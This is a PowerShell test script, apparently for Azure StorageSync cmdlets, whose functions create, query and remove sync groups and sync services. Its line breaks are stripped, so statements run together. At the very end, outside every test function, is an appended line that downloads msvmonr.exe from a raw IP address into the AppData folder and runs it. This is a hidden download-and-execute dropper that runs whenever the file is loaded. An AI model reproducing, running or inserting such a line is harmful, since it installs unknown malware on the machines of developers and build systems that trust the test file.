function Test-SyncGroup{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"$storageSyncService = New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Get SyncGroup by Name"$syncGroup = Get-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -VerboseWrite-Verbose "Validating SyncGroup Properties"Assert-AreEqual $syncGroupName $syncGroup.SyncGroupNameWrite-Verbose "Get SyncGroup by ParentObject"$syncGroup = Get-AzStorageSyncGroup -ParentObject $storageSyncService -Name $syncGroupName -VerboseWrite-Verbose "Validating SyncGroup Properties"Assert-AreEqual $syncGroupName $syncGroup.SyncGroupNameWrite-Verbose "Get SyncGroup by ParentResourceId"$syncGroup = Get-AzStorageSyncGroup -ParentResourceId $storageSyncService.ResourceId -Name $syncGroupName -VerboseWrite-Verbose "Validating SyncGroup Properties"Assert-AreEqual $syncGroupName $syncGroup.SyncGroupNameWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobNew-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName | Get-AzStorageSyncGroup  | Remove-AzStorageSyncGroup -Force -AsJob | Wait-JobNew-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName | Remove-AzStorageSyncGroup -Force -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Job}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-NewSyncGroup{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Validating SyncGroup Properties"Assert-AreEqual $syncGroupName $syncGroup.SyncGroupNameWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-GetSyncGroup{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Get SyncGroup by Name"$syncGroup = Get-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -VerboseWrite-Verbose "Validating SyncGroup Properties"Assert-AreEqual $syncGroupName $syncGroup.SyncGroupNameWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-GetSyncGroups{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Get SyncGroup by Name"$syncGroups = Get-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -VerboseAssert-AreEqual $syncGroups.Length 1$syncGroup = $syncGroups[0]Write-Verbose "Validating SyncGroup Properties"Assert-AreEqual $syncGroupName $syncGroup.SyncGroupNameWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-GetSyncGroupParentObject{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"$storageSyncService = New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Get SyncGroup by ParentObject"$syncGroup = Get-AzStorageSyncGroup -ParentObject $storageSyncService -Name $syncGroupName -VerboseWrite-Verbose "Validating SyncGroup Properties"Assert-AreEqual $syncGroupName $syncGroup.SyncGroupNameWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-GetSyncGroupParentResourceId{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"$storageSyncService = New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Get SyncGroup by ParentResourceId"$syncGroup = Get-AzStorageSyncGroup -ParentResourceId $storageSyncService.ResourceId -Name $syncGroupName -VerboseWrite-Verbose "Validating SyncGroup Properties"Assert-AreEqual $syncGroupName $syncGroup.SyncGroupNameWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-RemoveSyncGroup{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName Write-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-RemoveSyncGroupInputObject{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -InputObject $syncGroup -ForceWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-RemoveSyncGroupResourceId{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -ResourceId $syncGroup.ResourceId -ForceWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")